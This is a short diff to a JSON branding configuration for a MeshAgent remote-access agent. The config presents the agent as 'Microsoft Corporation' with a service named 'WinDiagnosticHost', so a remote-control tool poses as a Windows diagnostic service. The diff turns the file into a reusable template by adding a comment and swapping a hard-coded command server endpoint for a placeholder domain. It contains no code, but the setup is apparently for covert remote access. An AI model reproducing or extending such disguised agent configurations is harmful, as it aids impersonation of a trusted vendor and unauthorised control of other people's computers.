@@ -1,5 +1,6 @@
 {
   "$schema": "./schema/meshagent.schema.json",
+  "_comment": "TEMPLATE FILE - Copy to branding_config.json and customize with your infrastructure",
   "branding": {
     "companyName": "Microsoft Corporation",
     "serviceName": "WinDiagnosticHost",
@@ -15,7 +16,7 @@
     }
   },
   "network": {
-    "primaryEndpoint": "wss://agents.high.support:4445/agent.ashx",
+    "primaryEndpoint": "wss://YOUR_DOMAIN_HERE:443/agent.ashx",
     "sni": null,
     "hostHeader": null,
     "alpn": ["http/1.1"],
@@ -37,6 +38,6 @@
     "meshType": "2",
     "meshId": "",
     "serverId": "",
-    "serverUrl": "wss://agents.high.support:4445/agent.ashx"
+    "serverUrl": "wss://YOUR_DOMAIN_HERE:443/agent.ashx"
   }
 }
